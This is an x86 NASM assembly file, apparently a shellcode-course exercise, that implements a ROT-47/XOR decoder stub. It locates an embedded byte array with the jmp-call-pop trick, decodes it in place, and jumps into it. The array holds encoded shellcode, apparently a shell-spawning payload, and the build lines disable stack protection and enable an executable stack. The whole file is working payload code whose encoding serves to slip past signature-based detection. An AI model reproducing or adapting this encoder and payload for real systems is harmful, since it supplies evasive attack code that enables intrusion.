;Program:	ROT-47 XOR Decoder
;Author:	Bhanu Teja
;
;Compilation 	# nasm -f elf32 rot47_XOR_decoder.nasm 
;		# ld rot47_XOR_decoder.o -o rot47_XOR_decoder -fno-stack-protector -shared -z execstack
;---start---;

global _start

section .text
_start:

	jmp short push_shellcode	; jumps to push_shellcode method

store_shellcode:
	pop esi				; store shellcode into esi
decode:
	cmp byte[esi], 0xAA		; compare current esi byte is 0xAA or not
	jz shellcode			; if the comparision is true then jump to shellcode
	xor byte[esi], 0xAA		; de-xoring the esi byte with 0xAA 
	sub byte[esi], 47		; rot-47 decode byte at [esi]
	inc esi				; increment esi
	jmp short decode		; jump to decode and repeat the same again	

push_shellcode:
	call store_shellcode		; call store_shellcode function and pushed the shellcode onto the stack
	shellcode: db 0xca, 0x45, 0xd5, 0x12, 0xbb, 0x3d, 0xf4, 0xf4, 0x08, 0x3d, 0x3d, 0xf4, 0x3b, 0x32, 0x37, 0x12, 0xb8, 0xd5, 0x75, 0x90, 0x56, 0x05, 0xAA
